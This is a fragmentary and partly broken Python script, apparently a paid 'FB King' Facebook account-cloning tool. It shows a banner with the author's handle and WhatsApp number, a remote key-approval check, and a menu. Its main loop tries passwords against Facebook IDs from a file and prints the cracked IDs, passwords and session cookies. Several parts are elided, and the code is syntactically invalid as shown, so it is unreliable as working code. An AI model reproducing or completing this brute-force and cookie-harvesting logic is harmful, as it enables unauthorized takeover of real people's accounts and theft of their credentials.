...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'fb' and password == 'Love':
...
os.system('xdg-open https://www.facebook.com/mobasser04')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-FB-KING-PRO ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Fb king ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mm9woridking ]   ║\33[1;34m   
╠══[Whatsapp                 • 01861980904 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 12.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	FB-KING-PROj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	TUTULj('\033[0;97m===============================================')
	FB-KING-PRO= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if FB-KING-PRO in ['m']:
		public()
	elif FB-KING-PRO in ['1']:
		crack_file()
	elif FB-KING-PRO in ['i','0i']:
		result()
	elif FB-KING-PRO in ['2','02']:
		os.system('xdg-open https://wa.me/+8801861980904')
	elif FB-KING-PRO in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Fb-King-Pro
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•fb-Cp] {idf} • {pw}')     
				...
				#Fb-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Fb-king-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Fb-king,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/m9woridking/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+fb+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Fb+''+key1
		os.system('am start https://wa.me/+8801861980904?text=' + tks)
		Subscraption() 
Subscraption() 
login()